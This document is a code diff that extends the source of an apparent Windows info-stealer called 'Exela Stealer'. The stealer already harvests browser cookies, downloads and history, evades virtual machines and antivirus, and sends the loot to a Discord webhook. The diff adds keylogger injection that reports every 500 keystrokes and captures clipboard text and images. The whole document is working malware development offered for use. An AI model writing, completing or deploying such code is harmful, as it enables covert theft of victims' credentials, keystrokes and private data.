@@ -1,15 +1,16 @@
 import sqlite3, ctypes, mss, sys, ctypes, winreg, pygetwindow
 import os, wmi, win32api, platform, uuid, psutil, time, GPUtil
-import shutil, pythoncom
+import shutil, pythoncom, clipboard, keylogger.keylogger
+from PIL import ImageGrab
 import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
 from Crypto.Cipher import AES
 
 
 UrLxD = '%REPLACE_ME_FOR_QUiCADXD%'[::-1]
-Anti_Vm = "%AnTiVm%"
+Anti_Vm = "false"
 wantS = "%StartuP%"
 methodxd = "%MethoD%"
-
+injectKeylogger = "%keyloggerinject???%"
 
 class QuicaxdExela:
     def __init__(self):
@@ -670,6 +671,10 @@ class QuicaxdExela:
         embed.add_field(name="Total Cookies",  inline=True,value=f"```{self.cookie}```")
         embed.add_field(name="Total Download's",  inline=True,value=f"```{self.downloads}```")
         embed.add_field(name="Total History's",  inline=True,value=f"```{self.historys}```")
+        if injectKeylogger == "%keyloggertrue%":
+            embed.add_field(name="Inject Keylogger?", inline=True, value="```Yes, Keylogger logs will come after every 500 keystrokes```")
+        else:
+            embed.add_field(name="Inject Keylogger?", inline=True, value="```Nope```")
         embed.add_field(name="Exela Stealer is the best", inline=False, value=f"```{'just sex and money xd'}```")
         embed.set_footer(text="https://t.me/ExelaStealer")
         hooksxdd.send(embed=embed, file=filee)
@@ -686,6 +691,25 @@ class QuicaxdExela:
             return active_window.title if active_window else None
         except:
             return "Null"
+    def get_last_clipboard_text(self, path):
+        try:
+            pathsxd = os.getenv('temp') + "\\" + path
+            clipboard_data = clipboard.paste()
+            if not clipboard_data == "":
+                with open(pathsxd + "\\last_clipboard_text.txt", "a", encoding="utf-8", errors="ignore") as lst:
+                    lst.write("----------------------https://t.me/ExelaStealer/----------------------\n" + "=" * 70 + "\n")
+                    lst.write(clipboard_data)
+        except Exception as e:
+            print(str(e))
+    def get_last_clipboard_image(self, path):
+        try:
+            pathsxd = os.getenv('temp') + "\\" + path
+            captured_image = ImageGrab.grabclipboard()
+            if captured_image:
+                saved_file = pathsxd + "\\last_clipboard_image.png"
+                captured_image.save(saved_file, "PNG")
+        except Exception as e:
+            print(str(e))
     def get_all_system_data(self):
         command = "wmic csproduct get uuid"
         run = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
@@ -976,6 +1000,9 @@ class QuicaxdExela:
                 active_window_title = self.get_active_window_title()
                 with open(tmp + f"\\{run}\\active_window.txt", "a", encoding="utf-8", errors="ignore") as x:
                     x.write(str(active_window_title))
+            if 5 > 4:
+                self.get_last_clipboard_text(run)
+                self.get_last_clipboard_image(run)
             
 class HardAntiVM:
     def __init__(self) -> None:
@@ -1165,7 +1192,16 @@ class Antivirustotal:
             else:
                 continue           
 
-if __name__ == "__main__":
+def injectKeyloggers():
+    if injectKeylogger == "%keyloggertrue%":
+        try:
+            path = os.getenv('temp')
+            outputFile = path + "\\key_logs.txt"
+            keylogger.keylogger.main(outputFile, UrLxD)
+        except Exception as e:
+            print(str(e))
+
+def callAllFunctions():
     Antivirustotal()
     if Anti_Vm == "false":
         thread = threading.Thread(target=QuicaxdExela,daemon=True)
@@ -1173,3 +1209,6 @@ if __name__ == "__main__":
         thread.join()
     else:
         HardAntiVM()
+    injectKeyloggers()
+if __name__ == "__main__":
+    callAllFunctions()
